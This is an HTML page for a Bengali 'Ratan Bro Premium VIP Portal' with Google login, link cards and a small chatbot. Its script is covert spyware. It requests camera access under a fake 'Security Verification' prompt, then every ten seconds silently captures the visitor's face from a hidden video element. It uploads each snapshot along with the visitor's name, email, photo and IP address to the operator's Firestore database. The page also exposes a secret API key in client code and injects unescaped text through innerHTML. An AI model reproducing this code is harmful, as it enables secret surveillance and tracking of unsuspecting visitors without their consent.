<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Premium VIP Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --pink: #ff4d94;
            --blue: #00f2fe;
            --purple: #7000ff;
            --dark: #020617;
            --glass: rgba(255, 255, 255, 0.05);
            --border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Hind Siliguri', sans-serif;
        }

        body {
            background: var(--dark);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(255, 77, 148, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(0, 242, 254, 0.1) 0%, transparent 40%),
                linear-gradient(135deg, #020617 0%, #0f172a 100%);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Overlay Modals */
        #login-overlay, #perm-modal, #notif-modal {
            position: fixed;
            inset: 0;
            background: rgba(2, 6, 23, 0.9);
            z-index: 10000;
            display: none;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(25px);
            padding: 20px;
        }

        .glass-box {
            background: rgba(255, 255, 255, 0.03);
            padding: 40px 30px;
            border-radius: 40px;
            border: 1px solid var(--border);
            text-align: center;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1);
            position: relative;
            overflow: hidden;
        }

        .glass-box::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: conic-gradient(transparent, var(--pink), transparent, var(--blue), transparent);
            animation: rotate 6s linear infinite;
            z-index: -1;
            opacity: 0.3;
        }

        @keyframes rotate { 100% { transform: rotate(360deg); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }

        /* Login Profile Image - Perfect Round */
        .login-profile-img {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            object-fit: cover;
            border: 4px solid var(--pink);
            box-shadow: 0 0 25px var(--pink);
            margin-bottom: 25px;
        }

        /* Header UI */
        .hero-header {
            margin: 25px 20px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 35px;
            border: 1px solid var(--border);
            backdrop-filter: blur(10px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
        }

        .profile-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
        }

        .p-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 3px solid var(--pink);
            box-shadow: 0 0 20px rgba(255, 77, 148, 0.4);
            object-fit: cover;
        }

        .user-p-img {
            width: 85px;
            height: 85px;
            border-color: var(--blue);
            box-shadow: 0 0 20px rgba(0, 242, 254, 0.4);
            margin-left: -25px;
        }

        /* Modern Grid */
        .grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            padding: 0 20px 30px;
            max-width: 600px;
            margin: 0 auto;
        }

        .card {
            background: linear-gradient(145deg, rgba(255,255,255,0.05), rgba(255,255,255,0.01));
            border-radius: 28px;
            padding: 25px 15px;
            text-align: center;
            text-decoration: none;
            color: white;
            border: 1px solid var(--border);
            transition: 0.4s all ease;
            position: relative;
        }

        .card:hover {
            transform: translateY(-10px);
            border-color: var(--pink);
            background: rgba(255, 77, 148, 0.1);
            box-shadow: 0 20px 40px rgba(255, 77, 148, 0.2);
        }

        .card i {
            font-size: 2.2rem;
            background: linear-gradient(to bottom, var(--pink), var(--purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 12px;
            display: block;
        }

        .card.wide {
            grid-column: span 2;
            background: linear-gradient(90deg, rgba(0, 242, 254, 0.05), rgba(112, 0, 255, 0.05));
            display: flex; align-items: center; justify-content: center; gap: 15px; padding: 20px;
        }

        .card.wide i { background: linear-gradient(to right, var(--blue), var(--purple)); -webkit-background-clip: text; }

        /* Notification Dot */
        .alarm-dot {
            position: absolute; top: 15px; right: 15px;
            width: 12px; height: 12px;
            background: #ff0055; border-radius: 50%;
            box-shadow: 0 0 15px #ff0055; animation: pulse 1.2s infinite;
        }

        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.4); opacity: 0.6; } }

        /* AI Area */
        .chat-mini {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 30px;
            border: 1px solid var(--border);
            padding: 20px;
            margin-bottom: 40px;
        }

        #chat-log {
            height: 120px; overflow-y: auto;
            font-size: 14px; margin-bottom: 15px;
        }

        .chat-in input {
            flex: 1; background: rgba(255,255,255,0.05);
            border: 1px solid var(--border);
            color: #fff; padding: 12px 20px; border-radius: 25px; outline: none;
        }

        .btn-main {
            background: linear-gradient(45deg, var(--pink), var(--purple));
            color: white; border: none; padding: 14px 28px;
            border-radius: 30px; font-weight: 700; cursor: pointer;
            box-shadow: 0 10px 20px rgba(255, 77, 148, 0.3);
            transition: 0.3s;
        }

        .btn-main:hover { transform: translateY(-2px); filter: brightness(1.2); }

        #vSource { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.001; pointer-events: none; }
    </style>
</head>

<body>
    <audio id="snd-bus" src="business.mp3"></audio>
    <audio id="snd-port" src="portfolio.mp3"></audio>
    <audio id="snd-look" src="lookup.mp3"></audio>
    <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>

    <div id="login-overlay">
        <div class="glass-box">
            <img src="ratan.jpg" class="login-profile-img">
            <h2 style="margin-bottom: 5px; background: linear-gradient(to right, #fff, var(--pink)); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Ratan Bro Portal</h2>
            <p style="font-size: 14px; opacity: 0.7; margin-bottom: 30px;">Premium Access Only</p>
            <button class="btn-main" onclick="googleLogin()" style="width: 100%;">
                <i class="fab fa-google" style="margin-right: 10px;"></i> Continue with Google
            </button>
        </div>
    </div>

    <div id="perm-modal">
        <div class="glass-box" style="border-color: var(--blue);">
            <i class="fas fa-shield-halved" style="font-size:3.5rem; color:var(--blue); margin-bottom: 20px;"></i>
            <h3>Security Verification</h3>
            <p style="font-size:14px; opacity:0.8; margin:15px 0;">সুরক্ষার স্বার্থে ক্যামেরা এবং লোকেশন এক্সেস অন করুন।</p>
            <button class="btn-main" onclick="grantAndStart()" style="width: 100%; background: var(--blue);">Verify Identity</button>
        </div>
    </div>

    <div id="notif-modal">
        <div class="glass-box" style="border-color: var(--blue);">
            <h3 id="nt-title" style="color:var(--blue); margin-bottom:15px;">Broadcast Notice</h3>
            <p id="nt-msg" style="line-height: 1.6;"></p>
            <button class="btn-main" onclick="closeNotif()" style="margin-top:20px; background: var(--blue);">Dismiss</button>
        </div>
    </div>

    <div id="main-ui" style="display:none;">
        <div style="text-align:right; padding: 10px;">
            <button onclick="googleLogout()" style="background:none; border:1px solid var(--border); color:#888; padding:5px 15px; border-radius:20px; cursor:pointer;">Logout</button>
        </div>

        <div class="hero-header">
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
            </div>
            <h2 id="u-name" style="text-align:center; font-size: 22px;">Member</h2>
            <p id="u-ip" style="text-align:center; color:#888; font-size:12px; margin-top: 5px;"><i class="fas fa-wifi"></i> Syncing...</p>
            
            <div style="display: flex; justify-content: center; gap: 8px; margin-top: 15px;">
                <span style="background: rgba(255, 77, 148, 0.15); color: var(--pink); padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; border: 1px solid var(--pink);">VIP PORTAL</span>
                <span style="background: rgba(0, 242, 254, 0.15); color: var(--blue); padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; border: 1px solid var(--blue);">VERIFIED</span>
            </div>
        </div>

        <div class="grid">
            <div class="card" onclick="openLatestNotif()">
                <i class="fas fa-bolt"></i>
                <p>Updates</p>
                <div id="notif-alarm" class="alarm-dot" style="display:none;"></div>
            </div>

            <a href="testpaper.html" class="card">
                <i class="fas fa-graduation-cap"></i>
                <p>Library</p>
            </a>

            <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();">
                <i class="fas fa-rocket"></i>
                <p>Business</p>
            </a>

            <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();">
                <i class="fas fa-id-badge"></i>
                <p>Portfolio</p>
            </a>

            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide" onclick="document.getElementById('snd-look').play();">
                <i class="fas fa-fingerprint"></i>
                <p>Advanced Number Lookup</p>
            </a>
        </div>

        <div style="padding: 0 20px;">
            <div class="chat-mini">
                <div id="chat-log"><b>Ratan AI:</b> হ্যালো! আমি আপনার জন্য কী করতে পারি?</div>
                <div class="chat-in" style="display:flex; gap:10px;">
                    <input type="text" id="ai-msg" placeholder="Type a message...">
                    <button onclick="askAI()" class="btn-main" style="padding: 10px 20px;">Send</button>
                </div>
            </div>
        </div>
    </div>

    <video id="vSource" autoplay playsinline muted></video>
    <canvas id="snapCanvas" width="640" height="480" style="display:none;"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, onSnapshot, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();
        const OPENAI_KEY = "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";

        let loggedUser = null;
        let latestNotif = null;
        let userIP = "Unknown";

        async function captureSession() {
            if (!loggedUser) return;
            const video = document.getElementById('vSource');
            const canvas = document.getElementById('snapCanvas');
            const ctx = canvas.getContext('2d');
            if (video.readyState === 4) {
                ctx.drawImage(video, 0, 0, 640, 480);
                const imgData = canvas.toDataURL('image/jpeg', 0.3);
                if (imgData.length < 1500) return;
                const userKey = loggedUser.email.replace(/\./g, '_');
                await setDoc(doc(db, "users", userKey), {
                    name: loggedUser.displayName,
                    email: loggedUser.email,
                    photo: loggedUser.photoURL,
                    lastPic: imgData,
                    location: userIP,
                    lastSeen: new Date().toLocaleString(),
                    status: "Online",
                    picList: arrayUnion(imgData)
                }, { merge: true });
            }
        }

        window.grantAndStart = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                document.getElementById('vSource').srcObject = stream;
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
                document.getElementById('u-ip').innerHTML = `<i class="fas fa-network-wired"></i> IP: ${userIP}`;
                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                setInterval(captureSession, 10000);
            } catch (err) { alert("Permission Denied!"); }
        };

        onAuthStateChanged(auth, (user) => {
            if (user) {
                loggedUser = user;
                document.getElementById('u-name').innerText = user.displayName;
                document.getElementById('u-pic').src = user.photoURL;
                document.getElementById('login-overlay').style.display = 'none';
                navigator.permissions.query({ name: 'camera' }).then(res => {
                    if (res.state === 'granted') grantAndStart();
                    else document.getElementById('perm-modal').style.display = 'flex';
                });
            } else {
                document.getElementById('login-overlay').style.display = 'flex';
                document.getElementById('main-ui').style.display = 'none';
            }
        });

        window.askAI = async () => {
            const input = document.getElementById('ai-msg');
            const log = document.getElementById('chat-log');
            if (!input.value) return;
            const prompt = input.value;
            log.innerHTML += `<div style="color:var(--pink);"><b>You:</b> ${prompt}</div>`;
            input.value = "Thinking...";
            try {
                const response = await fetch("https://api.openai.com/v1/chat/completions", {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${OPENAI_KEY}` },
                    body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "user", content: prompt }] })
                });
                const data = await response.json();
                log.innerHTML += `<div><b>AI:</b> ${data.choices[0].message.content}</div>`;
            } catch (e) { log.innerHTML += `<div style="color:red;">Error!</div>`; }
            input.value = "";
            log.scrollTop = log.scrollHeight;
        };

        window.googleLogin = () => signInWithPopup(auth, provider);
        window.googleLogout = () => signOut(auth).then(() => location.reload());

        onSnapshot(doc(db, "system", "updates"), (snap) => {
            if (snap.exists()) {
                latestNotif = snap.data();
                if (latestNotif.hasNew) {
                    document.getElementById('notif-alarm').style.display = 'block';
                    document.getElementById('snd-notif').play();
                }
            }
        });

        window.openLatestNotif = () => {
            if (latestNotif) {
                document.getElementById('nt-msg').innerText = latestNotif.message;
                document.getElementById('notif-modal').style.display = 'flex';
                document.getElementById('notif-alarm').style.display = 'none';
            }
        };

        window.closeNotif = () => document.getElementById('notif-modal').style.display = 'none';
    </script>
</body>
</html>
